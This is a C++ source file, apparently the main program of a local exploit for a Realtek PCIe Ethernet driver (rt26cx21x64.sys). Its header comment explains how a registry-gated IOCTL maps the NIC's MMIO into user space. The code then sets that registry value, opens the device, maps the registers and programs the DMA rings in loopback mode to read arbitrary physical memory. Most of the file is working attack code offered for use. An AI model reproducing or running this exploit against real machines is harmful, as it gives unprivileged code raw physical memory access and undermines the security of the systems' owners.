// Copyright (c) 2026 Evie Fogarty. All rights reserved.
// rt26cx21x64.sys exploit (Realtek PCIe GbE/2.5GbE/5GbE family)
//
// OID 0xFF816871 maps the nic's mmio bar into the calling proc's virtual addr
// space, (MmLockedPagesSpecifyCache), reachable from um
// (\\.\RealTekCard{GUID}). This IOCTL (0x0012C818) is gated by a fucking
// registry value lmfao (DrvMode=4)
//
// Once we have mmio reg access, we program the nic's tx/rx descriptor rings
// in loopback mode to r/w arbitrary phys addrs,
// (AllocateUserPhysicalPages gives us PFNs).

#include <algorithm>
#include <array>
#include <format>
#include <print>
#include <ranges>
#include <string>

#include "dma_engine.h"
#include "exploit.h"
#include "mmio.h"
#include "raii.h"
#include "registry.h"
#include <Windows.h>

int main() {
  auto nic_id = find_realtek_instance_id();
  if (!nic_id) {
    std::println(stderr, "[-] {}", to_string(nic_id.error()));
    return 1;
  }

  std::println("[+] NIC instance: {}", narrow(*nic_id));

  if (set_drv_mode(*nic_id)) {
    std::println("[+] reboot required, run again after. (this isn't an error)");
    return 0;
  }
  std::println("[+] Registry value configured");

  auto device_path = std::format(L"\\\\.\\RealTekCard{}", *nic_id);
  std::println("[*] Opening device...");
  auto device = wrap_handle(CreateFileW(
      device_path.c_str(), GENERIC_READ | GENERIC_WRITE,
      FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr));
  if (!device) {
    std::println(stderr, "[-] CreateFile failed: {}", GetLastError());
    return 1;
  }
  std::println("[+] Device opened");

  auto mmio_result = map_mmio(device.get());
  if (!mmio_result) {
    std::println(stderr, "[-] {}", to_string(mmio_result.error()));
    return 1;
  }
  auto mmio = MmioAccess{*mmio_result};
  std::println("[+] MMIO mapped at: {}", *mmio_result);

  auto mac = mmio.mac_address();
  std::println("[+] MAC: {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}", mac[0],
               mac[1], mac[2], mac[3], mac[4], mac[5]); // kinda ugly

  std::println("[*] Allocating phys pages...");
  auto dma_result = DmaEngine::create(*mmio_result);
  if (!dma_result) {
    std::println(stderr, "[-] {}", to_string(dma_result.error()));
    return 1;
  }
  auto &dma = *dma_result;
  dma.save_and_setup_loopback();

  if (!dma.self_test()) {
    std::println(stderr, "[-] No working doorbell found");
    return 1;
  }

  std::println("[*] Physical memory read...");
  std::array<uint8_t, 64> test_buf{};
  if (auto r = dma.phys_read(0xF0000, test_buf); !r) {
    std::println(stderr, "[-] Physical read failed: {}", to_string(r.error()));
    return 1;
  }

  auto first16 = test_buf | std::views::take(16);
  std::print("[+] First 16 bytes: ");
  for (auto b : first16)
    std::print("{:02X} ", b);
  std::println("");

  if (std::ranges::all_of(first16, [](uint8_t b) { return b == 0; }))
    std::println("[-] Read returned all zeros, DMA may not be working");

  std::println("[+] Done.");
  return 0;
}